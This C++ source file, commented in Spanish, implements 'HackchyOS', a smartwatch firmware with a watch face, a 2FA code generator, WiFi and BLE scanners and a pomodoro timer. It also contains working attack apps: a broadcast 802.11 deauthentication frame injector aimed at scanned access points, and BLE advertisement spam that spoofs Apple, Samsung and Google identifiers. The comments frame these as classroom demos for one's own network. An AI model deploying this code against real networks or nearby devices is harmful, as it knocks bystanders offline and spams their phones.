#include "Watchy_HackchyOS.h"
#include "SpleenFonts.h"
#include "sha1.h"
#include "totp_accounts.h"
#ifndef HACKCHYOS_SIM
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_arduino_version.h>  // ESP_ARDUINO_VERSION_MAJOR: firma de BLEScan::start() cambia entre cores
#include <BLEDevice.h>      // BLE "Bluedroid" del core ESP32 (el mismo que ya usa Watchy)
#include <BLEScan.h>        // -> no uses NimBLE: choca con el BLE que incluye Watchy
#include <BLEAdvertising.h> // para la app de spam BLE (BLEDevice::getAdvertising())
#endif



// ---------------------------------------------------------------------------
//  Rejilla (pantalla 200x200). Cada panel: x0, y0, x1, y1 (incluidos)
// ---------------------------------------------------------------------------
static const int16_t L = 2, R = 197;                 // bordes de los paneles

static const int16_t A_TOP = 5,   A_BOT = 77;        // reloj
static const int16_t B_TOP = 85,  B_BOT = 158;       // pasos
static const int16_t C_TOP = 166, C_BOT = 196;       // luna | ayer
static const int16_t C_SPLIT = 108;                  // separación de los paneles de abajo

// ---------------------------------------------------------------------------
//  Memoria RTC: sobrevive al deep sleep
// ---------------------------------------------------------------------------
RTC_DATA_ATTR uint16_t htHourSteps[24];
RTC_DATA_ATTR uint32_t htLastCount = 0;
RTC_DATA_ATTR uint32_t htYesterday = 0;
RTC_DATA_ATTR uint8_t  htLogDay    = 0;

static const char *DIAS[]  = {"", "dom", "lun", "mar", "mie", "jue", "vie", "sab"};
static const char *MESES[] = {"", "ene", "feb", "mar", "abr", "may", "jun",
                              "jul", "ago", "sep", "oct", "nov", "dic"};
static const char *FASES[] = {"luna nueva", "creciente", "cuarto crec.",
                              "gibosa crec.", "luna llena", "gibosa meng.",
                              "cuarto meng.", "menguante"};

// Un año ISO tiene 53 semanas si empieza en jueves (o en miércoles siendo bisiesto)
static int isoWeeksInYear(int y) {
  int p  = (y + y / 4 - y / 100 + y / 400) % 7;
  int y1 = y - 1;
  int p1 = (y1 + y1 / 4 - y1 / 100 + y1 / 400) % 7;
  return (p == 4 || p1 == 3) ? 53 : 52;
}

// ===========================================================================
//  mini-OS: estado persistente
// ===========================================================================
RTC_DATA_ATTR int      hackState  = HS_WATCHFACE;
RTC_DATA_ATTR int      appSel     = 0;      // selección en el lanzador
RTC_DATA_ATTR int      launcherTop = 0;     // primera fila visible del lanzador
RTC_DATA_ATTR int      totpSel    = 0;      // cuenta 2FA seleccionada

// WiFi: resultados del último escaneo (los rellena runApps en el firmware)
RTC_DATA_ATTR int      wifiCount  = 0;
RTC_DATA_ATTR int      wifiTop    = 0;      // primera fila visible
RTC_DATA_ATTR int      wifiSel    = 0;      // red seleccionada
RTC_DATA_ATTR int      wifiView   = 0;      // 0 = lista, 1 = canales
RTC_DATA_ATTR char     wifiSSID[12][20];
RTC_DATA_ATTR int8_t   wifiRSSI[12];
RTC_DATA_ATTR uint8_t  wifiChan[12];
RTC_DATA_ATTR uint8_t  wifiAuth[12];        // wifi_auth_mode_t crudo
RTC_DATA_ATTR uint8_t  wifiBSSID[12][6];    // MAC del punto de acceso
RTC_DATA_ATTR bool     wifiEnc[12];

// Monitor pasivo (promiscuo): contadores de la última ventana
RTC_DATA_ATTR uint32_t monBeacon  = 0;
RTC_DATA_ATTR uint32_t monProbe   = 0;
RTC_DATA_ATTR uint32_t monData    = 0;
RTC_DATA_ATTR uint32_t monDeauth  = 0;
RTC_DATA_ATTR uint32_t monOther   = 0;
RTC_DATA_ATTR uint32_t monTotal   = 0;
RTC_DATA_ATTR uint8_t  monChan    = 1;
RTC_DATA_ATTR bool     monHop     = true;
RTC_DATA_ATTR bool     monAlert   = false;

// Deauth (test de red propia): reutiliza los resultados del último escaneo
// WiFi (wifiSSID/wifiBSSID/wifiChan) como lista de objetivos, no escanea aparte.
RTC_DATA_ATTR int      deauthSel     = 0;      // índice en el array de wifi
RTC_DATA_ATTR bool     deauthRunning = false;
RTC_DATA_ATTR uint32_t deauthSent    = 0;      // tramas enviadas en esta sesión
RTC_DATA_ATTR int32_t  deauthLeft    = 0;      // segundos hasta el autocorte
RTC_DATA_ATTR int32_t  deauthLastErr = 0;      // último esp_err_t de esp_wifi_80211_tx (diagnóstico)
RTC_DATA_ATTR int32_t  deauthChanErr = 0;      // retorno de esp_wifi_set_channel (diagnóstico)
RTC_DATA_ATTR uint8_t  deauthRealChan = 0;     // canal que el radio dice tener activo (diagnóstico)
RTC_DATA_ATTR int32_t  deauthWifiStatus = 0;   // WiFi.status(): ¿seguimos asociados a algo? (diagnóstico)

// Spam BLE: anuncios falsos (sin objetivo, afecta a cualquiera que esté cerca)
RTC_DATA_ATTR int      bleSpamMode    = 0;      // plantilla elegida (ver BLESPAM_NAMES)
RTC_DATA_ATTR bool     bleSpamRunning = false;
RTC_DATA_ATTR uint32_t bleSpamSent    = 0;      // anuncios emitidos en esta sesión
RTC_DATA_ATTR int32_t  bleSpamLeft    = 0;      // segundos hasta el autocorte

// Pomodoro
RTC_DATA_ATTR bool     pomoRun    = false;
RTC_DATA_ATTR bool     pomoBreak  = false;
RTC_DATA_ATTR int32_t  pomoLeft   = POMO_WORK_MIN * 60;
RTC_DATA_ATTR int      pomoCycles = 0;

// Despertador
RTC_DATA_ATTR bool     almOn      = false;
RTC_DATA_ATTR uint8_t  almH       = 7;
RTC_DATA_ATTR uint8_t  almM       = 30;
RTC_DATA_ATTR int      almLastMin = -1;     // evita repetir dentro del mismo minuto

static const char *APP_NAMES[] = {"2fa / totp", "escaner wifi", "monitor 802.11",
                                  "deauth test", "ble spam", "bluetooth", "pomodoro"};

// ===========================================================================
//  Bluetooth LE: estado del escáner + detector de trackers
// ===========================================================================
enum { TRK_NONE = 0, TRK_APPLE, TRK_SAMSUNG, TRK_TILE, TRK_FINDMY };

RTC_DATA_ATTR int      bleCount = 0;
RTC_DATA_ATTR int      bleTop   = 0;      // primera fila visible
RTC_DATA_ATTR int      bleSel   = 0;      // dispositivo seleccionado
RTC_DATA_ATTR int      bleView  = 0;      // 0 = lista, 1 = trackers, 2 = densidad
RTC_DATA_ATTR char     bleName[16][20];
RTC_DATA_ATTR uint8_t  bleAddr[16][6];
RTC_DATA_ATTR int8_t   bleRSSI[16];
RTC_DATA_ATTR uint16_t bleCID[16];        // company id del manufacturer data (0xFFFF = ninguno)
RTC_DATA_ATTR uint8_t  bleKind[16];       // 0 normal; si no, tipo de tracker (TRK_*)

// Tabla de seguimiento: identidades de tracker vistas a lo largo del tiempo.
// OJO: los AirTag/SmartTag rotan su MAC (~15 min en modo "separado"), así que
// esto solo detecta seguimiento dentro de esa ventana; es una ayuda, no una
// garantía. Cada vez que abres la app se cuenta como una "sesión" de escaneo.
RTC_DATA_ATTR uint8_t  trkAddr[8][6];
RTC_DATA_ATTR uint8_t  trkKind[8];
RTC_DATA_ATTR uint16_t trkSeen[8];        // nº de sesiones distintas en que apareció
RTC_DATA_ATTR uint64_t trkFirst[8];       // unix, primera vez
RTC_DATA_ATTR uint64_t trkLast[8];        // unix, última vez
RTC_DATA_ATTR int      trkCount = 0;
RTC_DATA_ATTR bool     bleFollowAlert = false;
RTC_DATA_ATTR int8_t   bleWorstTrk = -1;  // índice del tracker más persistente


// ===========================================================================
//  Monitor: captura promiscua (solo escucha, nunca transmite)
// ===========================================================================
#ifndef HACKCHYOS_SIM
static volatile uint32_t cBeacon, cProbe, cData, cDeauth, cOther;

static void sniffCB(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *p = (wifi_promiscuous_pkt_t *)buf;
  const uint8_t *fr = p->payload;
  uint8_t subtype = (fr[0] >> 4) & 0x0F;
  if (type == WIFI_PKT_MGMT) {
    if      (subtype == 8)  cBeacon++;        // beacon
    else if (subtype == 4)  cProbe++;         // probe request
    else if (subtype == 12) cDeauth++;        // deauth
    else if (subtype == 10) cDeauth++;        // disassoc (lo juntamos con deauth)
    else                    cOther++;
  } else if (type == WIFI_PKT_DATA) {
    cData++;
  } else {
    cOther++;
  }
}

void WatchyHackchyOS::monitorSample() {
  if (monHop) monChan = monChan < 13 ? monChan + 1 : 1;
  esp_wifi_set_channel(monChan, WIFI_SECOND_CHAN_NONE);
  cBeacon = cProbe = cData = cDeauth = cOther = 0;
  delay(1000);                                 // ventana de escucha: 1 s en punto,
                                                // para que "tramas/s" sea literal
  monBeacon = cBeacon; monProbe = cProbe; monData = cData;
  monDeauth = cDeauth; monOther = cOther;
  monTotal  = monBeacon + monProbe + monData + monDeauth + monOther;
  monAlert  = monDeauth >= 10;                  // umbral de tormenta de deauth
}

// Apaga la radio del monitor. Única copia: la llaman tanto la salida por
// BACK como la salida por timeout de inactividad, para que ninguna se olvide.
void WatchyHackchyOS::stopMonitorRadio() {
  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_OFF);
}

// ===========================================================================
//  App: test de deauth — SOLO para probar tus propias redes/dispositivos.
//  Reutiliza el objetivo elegido entre los resultados de la app wifi; nunca
//  arranca sola (hay que pulsar MENU) y se corta a los DEAUTH_MAX_SECONDS
//  segundos aunque no la detengas tú, para que nunca quede "olvidada" emitiendo.
// ===========================================================================

// Plantilla de trama de deauth 802.11 (cabecera MAC de 24 bytes + motivo de
// 2 bytes). Destino broadcast: desconecta a todos los clientes asociados al
// BSSID de origen, no a uno concreto (no tenemos escaneo de estaciones).
static uint8_t deauthFrame[26] = {
  0xC0, 0x00,                          // Frame Control: tipo gestión, subtipo deauth
  0x00, 0x00,                          // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destino: broadcast (todos los clientes)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Origen: BSSID del objetivo (se rellena abajo)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID del objetivo (idem)
  0x00, 0x00,                          // Secuencia/fragmento
  0x01, 0x00,                          // Motivo: 1 = "unspecified reason"
};

// Una ráfaga corta por tick (se llama ~1 vez/segundo desde runApps). El
// número de tramas y la pausa entre ellas limitan a propósito la potencia
// del "ataque": esto es una demo de aula, no una herramienta de DoS seria.
void WatchyHackchyOS::deauthBurst() {
  if (deauthSel < 0 || deauthSel >= wifiCount) { deauthRunning = false; return; }
  const uint8_t *bssid = wifiBSSID[deauthSel];
  memcpy(deauthFrame + 10, bssid, 6);
  memcpy(deauthFrame + 16, bssid, 6);
  deauthChanErr = (int32_t)esp_wifi_set_channel(wifiChan[deauthSel], WIFI_SECOND_CHAN_NONE);
  wifi_second_chan_t secondChan;             // solo para rellenar el parámetro; no se usa
  esp_wifi_get_channel(&deauthRealChan, &secondChan);
  deauthWifiStatus = (int32_t)WiFi.status();  // ¿seguimos asociados a algo? (diagnóstico)

  // DIAGNÓSTICO: volcado completo por si el log interno del driver WiFi (que
  // normalmente explica por qué rechaza una trama) no sale con el nivel de
  // depuración por defecto. Solo una vez por ráfaga, no por cada trama.
  Serial.printf("[deauth] ch=%d real=%d wifiStatus=%d len=%u en_sys_seq=1 frame=",
                wifiChan[deauthSel], deauthRealChan, (int)deauthWifiStatus,
                (unsigned)sizeof(deauthFrame));
  for (size_t i = 0; i < sizeof(deauthFrame); i++) Serial.printf("%02X ", deauthFrame[i]);
  Serial.println();

  for (int i = 0; i < 10; i++) {
    // en_sys_seq = true: en IDF 5.x (core ESP32 3.x), si la interfaz ya está
    // levantada y se pasa false, esp_wifi_80211_tx devuelve ESP_ERR_INVALID_ARG
    // y NO envía nada. Con true deja que el driver ponga el nº de secuencia.
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), true);
    deauthLastErr = (int32_t)err;          // diagnóstico: se ve en la pantalla
    if (i == 0) Serial.printf("[deauth] esp_wifi_80211_tx -> 0x%x (%s)\n",
                              (int)err, esp_err_to_name(err));
    if (err == ESP_OK) deauthSent++;
    delay(5);
  }
}

void WatchyHackchyOS::stopDeauth() {
  deauthRunning = false;
  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_OFF);
}

// ===========================================================================
//  App: spam BLE — emite anuncios falsos (imitan un company ID/UUID conocido)
//  para mostrar que cualquiera puede anunciarse como un dispositivo BLE sin
//  autenticación. A diferencia del deauth, NO tiene objetivo: lo recibe
//  cualquier móvil BLE cercano, no uno elegido. Mismas barreras: nunca
//  arranca sola, autocorte a BLESPAM_MAX_SECONDS, ráfaga limitada.
//
//  Los bytes del "payload" son genéricos (compañía real + relleno simple),
//  no una réplica exacta del protocolo propietario de cada fabricante: basta
//  para demostrar el problema de fondo, no para garantizar un popup idéntico
//  al de un dispositivo real en cada versión de iOS/Android.
// ===========================================================================
struct BleSpamTemplate { const char *name; uint16_t companyId; };
static const BleSpamTemplate BLESPAM_TEMPLATES[] = {
  {"apple",   0x004C},   // Apple
  {"samsung", 0x0075},   // Samsung
  {"google",  0x00E0},   // Google
};
static const int BLESPAM_COUNT = sizeof(BLESPAM_TEMPLATES) / sizeof(BLESPAM_TEMPLATES[0]);
// nombres para la UI: las plantillas + "mix" (ronda las tres cada ráfaga)
static const char *BLESPAM_NAMES[] = {"apple", "samsung", "google", "mix"};

static void bleSpamOne(const BleSpamTemplate &tpl) {
  uint8_t md[2 + 5] = {
    (uint8_t)(tpl.companyId & 0xFF), (uint8_t)(tpl.companyId >> 8),
    0x0F, 0x05, 0xC1, 0x00, 0x00,            // relleno genérico, no un protocolo exacto
  };
  BLEAdvertisementData advData;
  advData.setFlags(0x06);                     // LE General Discoverable, sin BR/EDR
  // El core ESP32 3.x pide Arduino String; el 2.x pedía std::string. Los datos
  // llevan bytes 0x00, así que construimos el buffer byte a byte (no desde un
  // char* que se cortaría en el primer nulo).
#if defined(ESP_ARDUINO_VERSION_MAJOR) && ESP_ARDUINO_VERSION_MAJOR >= 3
  String mfg;
  mfg.reserve(sizeof(md));
  for (size_t i = 0; i < sizeof(md); i++) mfg += (char)md[i];
  advData.setManufacturerData(mfg);
#else
  advData.setManufacturerData(std::string((char *)md, sizeof(md)));
#endif
  BLEAdvertising *adv = BLEDevice::getAdvertising();
  adv->setAdvertisementData(advData);
  adv->start();
  delay(100);   // deja tiempo a que el comando asíncrono de configuración
                // llegue al controlador y salgan varios anuncios de verdad
  adv->stop();
}

// Una ráfaga corta por tick: la plantilla elegida, o las tres si el modo es
// "mix" (índice == BLESPAM_COUNT).
void WatchyHackchyOS::bleSpamBurst() {
  bool mix = bleSpamMode >= BLESPAM_COUNT;
  int first = mix ? 0 : bleSpamMode;
  int last  = mix ? BLESPAM_COUNT - 1 : bleSpamMode;
  for (int t = first; t <= last; t++) {
    bleSpamOne(BLESPAM_TEMPLATES[t]);
    bleSpamSent++;
  }
}

void WatchyHackchyOS::stopBleSpam() {
  bleSpamRunning = false;
  BLEDevice::getAdvertising()->stop();
  BLEDevice::deinit(false);
}
#endif

// ===========================================================================
//  Esfera + chequeo del despertador
// ===========================================================================
void WatchyHackchyOS::drawWatchFace() {
#ifndef HACKCHYOS_SIM
  RTC.read(currentTime);                  // hora siempre fresca (también al volver de una app)
#endif
  display.epd2.darkBorder = HT_DARKMODE;  // la librería lo aplica en el refresco completo

  updateStepLog(sensor.getCounter());
  uint32_t steps = sensor.getCounter();

  display.fillScreen(bg());
  display.setTextColor(fg());
  display.setTextWrap(false);
  display.setTextSize(1);

  drawClockPanel();
  drawStepsPanel(steps);
  drawMoonPanel();
  drawYesterdayPanel();

#ifndef HACKCHYOS_SIM
  checkAlarm();
#endif
}

#ifndef HACKCHYOS_SIM
// Única copia de la tanda de vibración: la llaman tanto la esfera como el
// tick de 1s de runApps() (para que suene también dentro de una app).
void WatchyHackchyOS::checkAlarm() {
  if (alarmDue()) for (uint8_t i = 0; i < 4; i++) vibMotor(75, 4);
}
#endif

bool WatchyHackchyOS::alarmDue() {
  if (!almOn) return false;
  if (currentTime.Hour == almH && currentTime.Minute == almM) {
    int minOfDay = currentTime.Hour * 60 + currentTime.Minute;
    if (minOfDay != almLastMin) { almLastMin = minOfDay; return true; }
  }
  return false;
}

// ===========================================================================
//  Enrutado de botones
// ===========================================================================
void WatchyHackchyOS::handleButtonPress() {
#ifndef HACKCHYOS_SIM
  RTC.read(currentTime);                 // al despertar por botón la hora no se relee sola
  uint64_t wake = esp_sleep_get_ext1_wakeup_status();
  if (hackState == HS_WATCHFACE) {
    if (wake & UP_BTN_MASK) {          // ARRIBA desde la esfera -> lanzador
      hackState = HS_LAUNCHER;
      appSel = 0;
      launcherTop = 0;
      runApps();
      return;
    }
    Watchy::handleButtonPress();       // el resto (MENU = menú del sistema, etc.)
    return;
  }
  runApps();                           // ya estábamos dentro de la mini-OS
#endif
}

#ifndef HACKCHYOS_SIM
// ¿hay algún botón físicamente pulsado ahora mismo?
static bool anyBtnPressed() {
  return digitalRead(MENU_BTN_PIN) == 1 || digitalRead(BACK_BTN_PIN) == 1 ||
         digitalRead(UP_BTN_PIN)   == 1 || digitalRead(DOWN_BTN_PIN) == 1;
}

// Bloquea hasta que se suelten los botones (o hasta maxMs, por si uno se queda
// pegado). Devuelve cuánto ha durado la espera, útil para medir pulsaciones
// largas (toque vs. toque mantenido).
static uint32_t waitForRelease(uint32_t maxMs = 0xFFFFFFFF) {
  uint32_t t0 = millis();
  while (anyBtnPressed() && millis() - t0 < maxMs) delay(10);
  return millis() - t0;
}
#endif

// Bucle interactivo: se mantiene despierto mientras se usa una app y vuelve a la
// esfera (deep sleep) tras 'TIMEOUT' sin pulsaciones o al salir con ATRÁS.
void WatchyHackchyOS::runApps() {
#ifndef HACKCHYOS_SIM
  const uint32_t TIMEOUT = 25000;
  pinMode(MENU_BTN_PIN, INPUT);
  pinMode(BACK_BTN_PIN, INPUT);
  pinMode(UP_BTN_PIN,   INPUT);
  pinMode(DOWN_BTN_PIN, INPUT);
  guiState = APP_STATE;                // avisa a la librería de que estamos ocupados

  // no proceses el botón que nos despertó: espera a soltarlo (si no, la pulsación
  // de UP que abre el lanzador movería la selección de la 1 a la última)
  waitForRelease();

  uint32_t last = millis();
  uint32_t lastTick = 0;
  bool dirty = true;

  while (millis() - last < TIMEOUT) {
    bool menu = digitalRead(MENU_BTN_PIN) == 1;
    bool back = digitalRead(BACK_BTN_PIN) == 1;
    bool up   = digitalRead(UP_BTN_PIN)   == 1;
    bool down = digitalRead(DOWN_BTN_PIN) == 1;
    bool pressed = menu || back || up || down;

    if (pressed) {
      last = millis();
      switch (hackState) {
        case HS_LAUNCHER:
          if (up)   appSel = (appSel + APP_COUNT - 1) % APP_COUNT;
          if (down) appSel = (appSel + 1) % APP_COUNT;
          if (menu) openApp((AppId)appSel);
          if (back) { hackState = HS_WATCHFACE; vibMotor(50, 2); return showWatchFace(true); }
          break;
        case HS_TOTP:
          if (up)   totpSel = (totpSel + TOTP_COUNT - 1) % TOTP_COUNT;
          if (down) totpSel = (totpSel + 1) % TOTP_COUNT;
          if (back) { hackState = HS_LAUNCHER; }
          break;
        case HS_WIFI:
          if (wifiView == 0) {
            if (up   && wifiSel > 0)             wifiSel--;
            if (down && wifiSel < wifiCount - 1) wifiSel++;
            if (menu) wifiView = 1;             // a la vista de canales
          } else {
            if (menu) wifiView = 0;             // de vuelta a la lista
          }
          if (back) { hackState = HS_LAUNCHER; }
          break;
        case HS_MON:
          if (menu) monHop = !monHop;           // saltar de canal / fijar
          if (up)   monChan = monChan < 13 ? monChan + 1 : 1;
          if (down) monChan = monChan > 1  ? monChan - 1 : 13;
          if (back) {
            stopMonitorRadio();
            hackState = HS_LAUNCHER;
          }
          break;
        case HS_DEAUTH:
          if (wifiCount > 0) {
            if (up   && deauthSel > 0)              deauthSel--;
            if (down && deauthSel < wifiCount - 1)  deauthSel++;
            if (menu) {                              // arma / corta la transmisión
              deauthRunning = !deauthRunning;
              if (deauthRunning) { deauthSent = 0; deauthLeft = DEAUTH_MAX_SECONDS; }
            }
          }
          if (back) {
            stopDeauth();
            hackState = HS_LAUNCHER;
          }
          break;
        case HS_BLESPAM:
          if (up)   bleSpamMode = (bleSpamMode + BLESPAM_COUNT) % (BLESPAM_COUNT + 1);
          if (down) bleSpamMode = (bleSpamMode + 1) % (BLESPAM_COUNT + 1);
          if (menu) {                              // arma / corta la transmisión
            bleSpamRunning = !bleSpamRunning;
            if (bleSpamRunning) { bleSpamSent = 0; bleSpamLeft = BLESPAM_MAX_SECONDS; }
          }
          if (back) {
            stopBleSpam();
            hackState = HS_LAUNCHER;
          }
          break;
        case HS_BLE:
          if (menu) bleView = (bleView + 1) % 3;      // lista -> trackers -> densidad
          if (bleView == 0) {                          // navegación solo en la lista
            if (up   && bleSel > 0)            bleSel--;
            if (down && bleSel < bleCount - 1) bleSel++;
          }
          if (back) { hackState = HS_LAUNCHER; }
          break;
        case HS_POMO:
          if (menu) pomoRun = !pomoRun;        // iniciar / pausar
          if (up)   { almM = (almM + 5) % 60; }
          if (down) { almH = (almH + 1) % 24; }
          if (back) {
            // mide la pulsación real: toque largo (>=600 ms) alterna la
            // alarma y se queda en la pantalla; toque corto sale como siempre
            uint32_t held = waitForRelease(2000);
            if (held >= 600) almOn = !almOn;
            else             hackState = HS_LAUNCHER;
          }
          break;
      }
      renderCurrent();
      display.display(true);
      waitForRelease();
      dirty = false;
    }

    if (dirty) { renderCurrent(); display.display(true); dirty = false; }

    // una vez por segundo: primero el despertador (debe sonar aunque estemos
    // dentro de una app, no solo en la esfera), luego las apps que avanzan solas
    if (millis() - lastTick >= 1000) {
      lastTick = millis();
      RTC.read(currentTime);             // hora fresca: el TOTP cuenta atrás de verdad
      checkAlarm();
      bool live = (hackState == HS_TOTP) || (hackState == HS_MON) ||
                  (hackState == HS_POMO && pomoRun) ||
                  (hackState == HS_DEAUTH && deauthRunning) ||
                  (hackState == HS_BLESPAM && bleSpamRunning);
      if (live) {
        if (hackState == HS_POMO && pomoRun && --pomoLeft <= 0) {
          vibMotor(100, 6);
          pomoBreak = !pomoBreak;
          if (!pomoBreak) pomoCycles++;
          pomoLeft = (pomoBreak ? POMO_BREAK_MIN : POMO_WORK_MIN) * 60;
        }
        if (hackState == HS_MON) monitorSample();
        if (hackState == HS_DEAUTH && deauthRunning) {
          deauthBurst();
          if (--deauthLeft <= 0) deauthRunning = false;   // autocorte de seguridad
        }
        if (hackState == HS_BLESPAM && bleSpamRunning) {
          bleSpamBurst();
          if (--bleSpamLeft <= 0) bleSpamRunning = false;  // autocorte de seguridad
        }
        renderCurrent();
        display.display(true);
      }
    }
    delay(40);
  }
  // si el timeout nos saca de una app que transmite, apaga la radio igual que
  // hace la salida por BACK (si no, se queda escuchando/transmitiendo)
  if (hackState == HS_MON)     stopMonitorRadio();
  if (hackState == HS_DEAUTH)  stopDeauth();
  if (hackState == HS_BLESPAM) stopBleSpam();
  hackState = HS_WATCHFACE;
  showWatchFace(true);
#endif
}

void WatchyHackchyOS::openApp(AppId id) {
#ifndef HACKCHYOS_SIM
  switch (id) {
    case APP_TOTP: hackState = HS_TOTP; break;
    case APP_POMO: hackState = HS_POMO; break;
    case APP_WIFI: {
      hackState = HS_WIFI;
      // escaneo pasivo de redes visibles
      WiFi.mode(WIFI_STA);
      WiFi.disconnect();
      int n = WiFi.scanNetworks();
      wifiCount = n > 12 ? 12 : (n < 0 ? 0 : n);
      for (int i = 0; i < wifiCount; i++) {
        strncpy(wifiSSID[i], WiFi.SSID(i).c_str(), 19); wifiSSID[i][19] = 0;
        if (wifiSSID[i][0] == 0) strcpy(wifiSSID[i], "<oculta>");
        wifiRSSI[i] = WiFi.RSSI(i);
        wifiChan[i] = WiFi.channel(i);
        wifiAuth[i] = (uint8_t)WiFi.encryptionType(i);
        wifiEnc[i]  = wifiAuth[i] != WIFI_AUTH_OPEN;
        memcpy(wifiBSSID[i], WiFi.BSSID(i), 6);
      }
      WiFi.scanDelete();
      WiFi.mode(WIFI_OFF);
      wifiTop = 0; wifiSel = 0; wifiView = 0;
      break;
    }
    case APP_MON:
      hackState = HS_MON;
      monBeacon = monProbe = monData = monDeauth = monOther = monTotal = 0;
      monAlert = false;
      WiFi.mode(WIFI_STA);
      // ver nota en APP_DEAUTH: sin esto, la reconexión en segundo plano a la
      // red configurada puede devolver el radio a su canal antes de que
      // monitorSample() termine de escuchar en el canal que tocaba
      WiFi.setAutoReconnect(false);
      WiFi.disconnect(false, true);
      esp_wifi_set_promiscuous(true);
      esp_wifi_set_promiscuous_rx_cb(&sniffCB);
      break;
    case APP_DEAUTH:
      // reutiliza el último escaneo de la app wifi como lista de objetivos;
      // nunca empieza a transmitir sola, hay que armarla con MENU
      hackState = HS_DEAUTH;
      deauthRunning = false;
      deauthSent = 0;
      if (deauthSel >= wifiCount) deauthSel = 0;
      WiFi.mode(WIFI_STA);
      // Watchy guarda credenciales WiFi reales (las del asistente, para clima/
      // NTP). Sin desactivar la reconexión y borrar el AP configurado, el
      // driver reintenta solo en segundo plano y nos devuelve al canal de esa
      // red antes de poder transmitir en el canal del objetivo.
      WiFi.setAutoReconnect(false);
      WiFi.disconnect(false, true);   // false=no apaga el radio, true=olvida el AP
      // sin esto, el ahorro de energía por defecto (WIFI_PS_MIN_MODEM) dormita
      // el radio entre operaciones: esp_wifi_80211_tx() puede devolver ESP_OK
      // sin que la trama llegue a salir por el aire. Imprescindible para TX.
      esp_wifi_set_ps(WIFI_PS_NONE);
      // DIAGNÓSTICO (2ª vuelta): la primera prueba de promiscuo no tenía aún
      // el diagnóstico de canal/WiFi.status() delante, así que no sabíamos si
      // de verdad arreglaba el canal aunque el error de TX siguiera igual.
      // Lo repetimos ahora que sí podemos verlo.
      esp_wifi_set_promiscuous(true);
      break;
    case APP_BLESPAM:
      // nunca empieza a transmitir sola, hay que armarla con MENU
      hackState = HS_BLESPAM;
      bleSpamRunning = false;
      bleSpamSent = 0;
      WiFi.mode(WIFI_OFF);              // coexistencia: libera la radio para BLE
      BLEDevice::init("");
      // sin esto, el intervalo de advertising por defecto (del orden de
      // segundos) deja la ventana de la ráfaga (ver bleSpamOne) demasiado
      // corta para que llegue a salir ni un solo anuncio por el aire.
      BLEDevice::getAdvertising()->setMinInterval(0x20);  // 0x20*0.625ms = 20ms
      BLEDevice::getAdvertising()->setMaxInterval(0x40);  // 0x40*0.625ms = 40ms
      break;
    case APP_BLE:
      hackState = HS_BLE;
      display.fillScreen(bg());                 // splash mientras dura el escaneo
      display.setTextColor(fg());
      display.setFont(&Spleen6x12);
      centerText(100, 100, "escaneando BLE...");
      display.display(true);
      bleScan();                                // escaneo pasivo (bloqueante, ~5 s)
      bleTop = bleSel = 0;
      bleView = 0;
      break;
    default: break;
  }
#endif
}

void WatchyHackchyOS::renderCurrent() {
  display.epd2.darkBorder = HT_DARKMODE;  // la librería lo aplica en el refresco completo
  display.fillScreen(bg());
  display.setTextColor(fg());
  display.setTextWrap(false);
  display.setTextSize(1);
  switch (hackState) {
    case HS_LAUNCHER: drawLauncher(); break;
    case HS_TOTP:     drawTOTP();     break;
    case HS_WIFI:     drawWiFi();     break;
    case HS_MON:      drawMonitor();  break;
    case HS_DEAUTH:   drawDeauth();   break;
    case HS_BLESPAM:  drawBleSpam();  break;
    case HS_BLE:      drawBluetooth();break;
    case HS_POMO:     drawPomodoro(); break;
    default:          drawWatchFace();break;
  }
}

uint64_t WatchyHackchyOS::unixUTC() {
  int y = currentTime.Year + 1970, m = currentTime.Month, d = currentTime.Day;
  y -= (m <= 2);
  long era = (y >= 0 ? y : y - 399) / 400;
  unsigned yoe = (unsigned)(y - era * 400);
  unsigned doy = (153 * (m + (m > 2 ? -3 : 9)) + 2) / 5 + d - 1;
  unsigned doe = yoe * 365 + yoe / 4 - yoe / 100 + doy;
  long days = era * 146097 + (long)doe - 719468;
  int64_t local = (int64_t)days * 86400 + currentTime.Hour * 3600 +
                  currentTime.Minute * 60 + currentTime.Second;
  return (uint64_t)(local - settings.gmtOffset);     // a UTC
}

// ===========================================================================
//  App: lanzador
// ===========================================================================
void WatchyHackchyOS::drawLauncher() {
  panel(L, 5, R, 32);
  title(L + 6, 5, "HackchyOS");
  char buf[16];
  float vbat = getBatteryVoltage();
  snprintf(buf, sizeof(buf), "%u%%", batteryPercent(vbat));
  title(R - 6, 5, buf, true);
  display.setFont(&Spleen6x12);
  char pos[8]; snprintf(pos, sizeof(pos), "%d/%d", appSel + 1, APP_COUNT);
  centerText(100, 26, "// apps");
  display.setFont(&Spleen5x8);
  textRight(R - 8, 25, pos);

  const int16_t rowH = 35, y0 = 40;
  const int visible = 4;                       // caben 4 filas; el resto hace scroll
  if (appSel < launcherTop)                launcherTop = appSel;
  if (appSel > launcherTop + visible - 1)  launcherTop = appSel - visible + 1;
  const char *desc[] = {"codigos de un solo uso", "redes al alcance",
                        "escucha de tramas", "ataque deauth (tu red)",
                        "anuncios BLE falsos", "trackers y dispositivos",
                        "foco + despertador"};
  for (int r = 0; r < visible && launcherTop + r < APP_COUNT; r++) {
    int i = launcherTop + r;
    int16_t y = y0 + r * rowH;
    bool sel = (i == appSel);
    panel(L, y, R, y + rowH - 5);
    if (sel) {
      display.fillRect(L + 4, y + 5, 4, rowH - 15, fg());
      display.setFont(&Spleen5x8);
      textRight(R - 7, y + 12, ">");
    }
    display.setFont(&Spleen12x24);
    display.setCursor(L + 16, y + 23);
    char n = '1' + i; display.print(n);
    display.setFont(&Spleen6x12);
    display.setCursor(L + 34, y + 14);
    display.print(APP_NAMES[i]);
    display.setFont(&Spleen5x8);
    display.setCursor(L + 34, y + 25);
    display.print(desc[i]);
  }
  display.setFont(&Spleen5x8);
  centerText(100, 196, "UP/DOWN mover  MENU abrir  BACK salir");
}

// ===========================================================================
//  App: autenticador 2FA (TOTP)
// ===========================================================================
void WatchyHackchyOS::drawTOTP() {
  panel(L, 5, R, 32);
  title(L + 6, 5, "2fa");
